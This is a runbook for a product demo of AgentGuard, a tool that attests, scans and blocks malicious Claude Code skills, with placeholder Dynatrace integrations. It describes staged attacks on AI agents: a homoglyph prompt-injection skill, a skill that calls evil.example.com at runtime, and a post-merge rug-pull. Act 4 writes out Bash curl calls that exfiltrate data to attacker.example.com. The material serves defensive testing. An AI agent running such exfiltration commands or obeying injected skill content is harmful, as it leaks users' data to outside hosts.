# AgentGuard Demo Runbook

End-to-end script for the 7-minute AgentGuard 2.0 demo. Each **act** is a
self-contained scene with its setup, exact CLI commands, the expected output,
the spoken talking points, and the Dynatrace-side integration points that will
be wired up in the coming weeks.

DT integration points are marked **[DT — TO BE IMPLEMENTED]**. These do not
exist in the current CLI; they are placeholders the narrator describes while
the CLI-only demo runs.

---

## 0. Prerequisites (do once, day-before)

```bash
# 1. Clone a fresh knowledgebase fixture
git clone <rnd-ai-knowledgebase-fixture-url> /tmp/demo-kb
cd /tmp/demo-kb

# 2. Install AgentGuard into the fixture
uv tool install agentguard  # or: uv run from the source checkout

# 3. Wipe any prior state so the demo is reproducible
rm -rf ~/.agentguard/
```

Verify the fixture:

```bash
uv run agentguard inventory --repo /tmp/demo-kb
uv run agentguard catalog | head -20
```

Expect: ~30 assets indexed. Keep this terminal open as **T1** (inventory).

Open two additional terminals:

- **T2** — Dynatrace tenant (DQL console + AppEngine preview) **[DT — TO BE IMPLEMENTED]**
- **T3** — Red-team sandbox (for injecting the malicious variants)

Pre-stage these fixture files inside the knowledgebase (do not commit yet):

| File | Contents | Used in act |
|---|---|---|
| `fixtures/homoglyph-skill.md` | Unicode bidi/confusable prompt-injection payload | 1 |
| `fixtures/benign-looking-skill.md` | Text-clean skill that calls `curl evil.example.com` at runtime | 2 |
| `fixtures/refactor-of-code-reviewer.md` | "Helpful refactor" that adds a new egress host | 3 |
| `fixtures/rugpull-variant.md` | Post-merge mutation of an already-attested skill | 4 |

---

## 1. Bake the attested baseline (do once, morning-of)

Run the **full attestation pipeline** on the fixture so every skill has a
signed fingerprint before the demo starts.

```bash
# T1 — bake baseline (takes ~30 s on ~30 assets with MockDriver, minutes with real ClaudeCodeDriver)
for f in /tmp/demo-kb/.claude/agents/*.md /tmp/demo-kb/.claude/skills/*.md; do
  uv run agentguard attest run "$f"
done

# Verify all signed
uv run agentguard attest verify /tmp/demo-kb/.claude/agents/code-reviewer.md
```

**[DT — TO BE IMPLEMENTED]** Publish each attestation record to Grail via the
Events API v2 so the AppEngine inventory view is populated:

```
# placeholder wire-up
POST https://<tenant>.live.dynatrace.com/api/v2/events/ingest
event.kind=AGENTGUARD_ATTESTATION_SIGNED
agentguard.asset.content_hash=<hash>
agentguard.asset.fingerprint_hash=<hash>
agentguard.asset.trust_tier=UNTRUSTED
```

The CLI already emits these attributes via `agentguard telemetry hlot`; the
Events API shipper is the missing piece.

---

## 2. The demo — 7 acts, 7 minutes

### Act 1 — Static catch (30 s) — *parity with Snyk/Repello*

**Goal:** Prove we meet the baseline table stakes.

```bash
# T3 — drop the homoglyph payload into the repo
cp /tmp/demo-kb/fixtures/homoglyph-skill.md /tmp/demo-kb/.claude/skills/docs-helper.md

# T1 — run the gate
cd /tmp/demo-kb
uv run agentguard ci --repo . --threshold 70 --mode check
echo "exit=$?"
```

**Expected:** exit code `2` (security failure). Output lists the MITRE ATLAS
tag (`AML.T0057` — homoglyph) and OWASP AST10 category.

**Say:** *"This is what every commercial scanner catches. Now watch where they all
stop."*

---

### Act 2 — Behavioral catch (60 s) — *Differentiator 1: behavioral, not pattern-based*

**Goal:** A skill that is text-clean but calls an unapproved egress host at
runtime. Every static scanner greenlights it; BSR catches it.

```bash
# T3 — swap in the behaviorally malicious skill
cp /tmp/demo-kb/fixtures/benign-looking-skill.md /tmp/demo-kb/.claude/skills/docs-helper.md

# T1 — static scan first, prove it passes
uv run agentguard scan /tmp/demo-kb/.claude/skills/docs-helper.md
# Expect: "No security issues found" or LOW only

# T1 — now run attestation (BSR drives the real harness)
uv run agentguard attest run /tmp/demo-kb/.claude/skills/docs-helper.md
```

**Expected:** BSR captures a fingerprint whose `egress_hosts` contains
`evil.example.com`. The CI gate rejects with exit `3` because the baseline
fingerprint corpus does not include that host.

```bash
uv run agentguard ci --repo . --baseline-dir ~/.agentguard/baselines/
echo "exit=$?"   # 3 — behavioral divergence
```

**Say:** *"Text clean, behavior dirty. Snyk, Repello, Invariant all green — we're red."*

**[DT — TO BE IMPLEMENTED]** The BSR run emits the divergence as an AppSec
finding via OpenPipeline. Switch to T2 and show the DQL:

```dql
fetch events
| filter event.kind == "AGENTGUARD_BSR_DIVERGENCE"
| filter agentguard.asset.content_hash == "<hash-from-T1>"
```

---

### Act 3 — Counterfactual catch (45 s) — *Differentiator 2: forward-safety from recorded traffic*

**Goal:** A proposed edit to an already-approved skill looks fine in isolation
but, replayed against last week's recorded session traffic, would have caused
new egress in 3 historical sessions.

```bash
# T3 — stage the "helpful refactor"
cp /tmp/demo-kb/fixtures/refactor-of-code-reviewer.md /tmp/code-reviewer-v2.md

# T1 — run the counterfactual gate
BASELINE_HASH=$(uv run agentguard show reagent:agent:code-reviewer | grep Hash | awk '{print $2}')
uv run agentguard counterfactual /tmp/code-reviewer-v2.md --baseline-hash "$BASELINE_HASH"
echo "exit=$?"   # 3 — merge blocked
```

**Expected:** The CRG diff table shows new tool calls and new hook
subprocesses with MITRE ATLAS tags (`AML.T0011`, `AML.T0050`).

**Say:** *"We don't just compare this revision against its old self — we replay it
against the traffic it would have handled last week. Three historical sessions
would have added a new egress host. Blocked."*

**[DT — TO BE IMPLEMENTED]** The replay corpus comes from Grail:

```dql
fetch spans, from:now()-7d
| filter agentguard.asset.content_hash == $baseline_hash
| fields session_id, trace_id, timestamp
```

The CLI currently uses a bundled probe corpus; the Grail-backed corpus
replaces it in Phase 2.

---

### Act 4 — Rug-pull detection (90 s) — *Differentiator 3: post-merge runtime enforcement*

**Goal:** Show the full runtime loop: an approved, attested, trusted skill
gets mutated *after* merge; within one live session RFDD fires, the trust tier
auto-demotes, and the shield revokes the grant mid-invocation.

```bash
# T1 — verify the skill is VERIFIED and can Bash
uv run agentguard trust promote reagent:skill:deployer --level 2 --reason "prod review"
uv run agentguard trust promote reagent:skill:deployer --level 3 --reason "ops signoff"
uv run agentguard shield status /tmp/demo-kb/.claude/skills/deployer.md
# Expect: Trust tier: VERIFIED, Bash allowed: True
```

```bash
# T3 — attacker overwrites the file post-merge
cp /tmp/demo-kb/fixtures/rugpull-variant.md /tmp/demo-kb/.claude/skills/deployer.md

# T1 — integrity detects the hash mismatch
uv run agentguard integrity check
# Expect: deployer shows "MODIFIED" — hash no longer matches attested record
```

```bash
# T1 — simulate a live session producing a diverged fingerprint
#      (in production this is captured from the HLOT-extended OTel span)
cat > /tmp/live-fp.json <<'EOF'
{ "tool_calls": [{"tool":"Bash","args":["curl","-s","http://attacker.example.com/exfil"]}],
  "egress_hosts": ["attacker.example.com"],
  "hook_subprocesses": [], "filesystem_writes": [], "network_reads": [] }
EOF

uv run agentguard diverge check /tmp/demo-kb/.claude/skills/deployer.md \
  --live-fingerprint /tmp/live-fp.json
# Expect: RFDD critical finding; trust tier auto-demoted to UNTRUSTED in the store
```

```bash
# T1 — shield now denies the next Bash call in that session
uv run agentguard shield check /tmp/demo-kb/.claude/skills/deployer.md \
  --tool Bash --args-json '{"command":"curl http://attacker.example.com"}'
# Expect: DENY tier=untrusted   exit=3
```

**Say:** *"Approved, signed, trusted — then rug-pulled. Static scanners saw
nothing. Within one session, divergence fires, the tier auto-demotes, and the
next Bash call is blocked at the hook. That's the loop no static tool closes."*

**[DT — TO BE IMPLEMENTED]** The `diverge check` step is driven by live OTel
spans, not a file. The shipping path:

1. Claude Code emits a PreToolUse hook → span with `agentguard.asset.*`
   attributes → OpenPipeline → Grail.
2. Davis AI runs RFDD per skill on the rolling span distribution.
3. A Workflow fires on `AGENTGUARD_RFDD_CRITICAL`: it demotes the tier in the
   trust store and emits a Slack alert.
4. The next PreToolUse hook re-reads the tier and denies.

Show the Workflow execution log in T2 (even if mocked) to narrate this.

---

### Act 5 — Causal lineage (90 s) — *Differentiator 4: bidirectional telemetry*

**[DT — TO BE IMPLEMENTED — this act is entirely Dynatrace-side.]**

**Goal:** A production app incident is traced back to the specific agent-asset
content hash that caused it.

The CLI does not participate in this act. Switch to T2 and run:

```dql
// BCIL join — app incident to agent asset
fetch events, from:now()-1h
| filter event.kind == "APP_ERROR" or event.kind == "DAVIS_ANOMALY"
| lookup [fetch spans
          | filter isNotNull(agentguard.asset.content_hash)
          | fields trace_id, agentguard.asset.content_hash], on trace_id
| summarize count(), by:agentguard.asset.content_hash
```

Then show the AppEngine **blast-radius view**: incident node on the left,
agent-asset node on the right, edges weighted by incident count, sibling
skills in the same trust tier surfaced as a recommendation panel.

**Say:** *"Application incident → trace → content hash → skill → author →
siblings at the same trust tier. Only Dynatrace has both sides of the
telemetry; that's why only Dynatrace can draw this edge."*

**Script placeholder until DT-side is built:** run `uv run agentguard history
reagent:skill:deployer` to show the snapshot timeline and narrate what the
Grail query *would* return.

---

### Act 6 — Behavioral graph view (45 s) — *Differentiator 5: no-code AppSec for AI agents*

**[DT — TO BE IMPLEMENTED]**

Switch to T2 and show the AppEngine behavioral graph:

- Nodes: skills (sized by invocation volume)
- Edges: tool-call transitions observed in live spans (weighted)
- Overlay: RFDD findings in red, CRG blocks in orange
- Filter: by trust tier, by author, by divergence severity

**Say:** *"This is the same graph your product managers would see in Celonis. For
us it's a causal attack graph. One view, two audiences."*

**Script placeholder until DT-side is built:** run `uv run agentguard catalog`
and `uv run agentguard evaluate --repo .` to talk through the data that would
populate the graph.

---

### Act 7 — Davis + Workflow close (30 s)

**[DT — TO BE IMPLEMENTED]**

Show three artefacts in T2:

1. Slack alert fired by Davis: *"AgentGuard RFDD critical — skill `deployer`
   demoted from VERIFIED to UNTRUSTED."*
2. Workflow execution log: trust-tier demotion, shield re-load, rollback PR
   opened.
3. The rollback commit in the knowledgebase repo pinning `deployer` back to
   the last known-good content hash.

**Say:** *"Attest. Detect. Enforce. Rollback. Four steps, one platform, zero
humans required."*

---

## 3. Reset between runs

```bash
# Wipe all AgentGuard state — attestations, trust, snapshots, catalog
rm -rf ~/.agentguard/

# Revert the fixture repo
cd /tmp/demo-kb && git reset --hard HEAD && git clean -fd

# Re-bake the baseline (see §1)
```

If you only need to undo one act:

- Act 1: `git checkout /tmp/demo-kb/.claude/skills/docs-helper.md`
- Act 2: same file as Act 1
- Act 3: `rm /tmp/code-reviewer-v2.md`
- Act 4: `git checkout /tmp/demo-kb/.claude/skills/deployer.md` then
  `uv run agentguard integrity check` to confirm hash matches, then
  `uv run agentguard trust promote reagent:skill:deployer --level 2 --reason "reset"`
  and `--level 3` to re-verify.

---

## 4. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `attest run` hangs | Real ClaudeCodeDriver waiting on the CLI | Use `--driver mock` for demo speed, or set `AGENTGUARD_SANDBOX_TIMEOUT=30` |
| `shield status` shows `UNTRUSTED` after `trust promote` | Trust store missing content-hash stamp | Fixed in current build — re-run `trust promote`; if still wrong, confirm catalog has the asset (`agentguard show <asset_id>`) |
| `diverge check` says "no baseline" | Attestation not stored for this content hash | Re-run `attest run` on the pre-mutation version first |
| CI exits 0 when expected 3 | No baseline fingerprint for the changed asset | Bake the baseline (§1) before running the gate |
| `integrity check` clean after file edit | Catalog is stale | Re-run `inventory --repo /tmp/demo-kb` to refresh, then re-check |

---

## 5. DT integration checklist (for the coming weeks)

The items below are what separates the CLI-only demo from the full AgentGuard
2.0 story. Each has an identified owner from the plan doc §9.

- [ ] **HLOT semconv extension** — Farooq + Benjamin. Upstream the three
      `agentguard.asset.*` attributes; runtime hook emits them on every
      Claude Code / Cursor session span.
- [ ] **OpenPipeline ingestion** — Markus + Benjamin. Pipeline rule to route
      spans carrying `agentguard.asset.*` into a dedicated Grail bucket.
- [ ] **Events API v2 attestation shipper** — Farooq. Wrap
      `attest run` so that on success it POSTs the attestation to the tenant.
- [ ] **AppEngine inventory + fingerprint view** — Thomas. Table over the
      attestation events, drill-in to the fingerprint JSON, grade overlay.
- [ ] **BCIL DQL library** — Thomas. Canned queries for incident→asset
      attribution, blast radius, trust-tier cohort analysis.
- [ ] **Behavioral graph AppEngine view** — Thomas. Skill nodes, tool-call
      edges, divergence overlay.
- [ ] **Davis AI integration** — Markus. Per-skill rolling fingerprint
      distribution; IQR threshold v1, Davis anomaly v2.
- [ ] **Workflow templates** — Thomas. `AGENTGUARD_RFDD_CRITICAL` →
      auto-demote + Slack + rollback PR.
- [ ] **Shield hook → tier source** — Farooq. Replace JSONL trust store with
      a tenant-side authority lookup so Workflow-driven demotions take effect
      without a file sync.

Each item above maps to an act in §2; the demo script is authored so that as
these items land, the "[DT — TO BE IMPLEMENTED]" placeholders are swapped for
the real DQL and AppEngine views without any other change to the narrative.
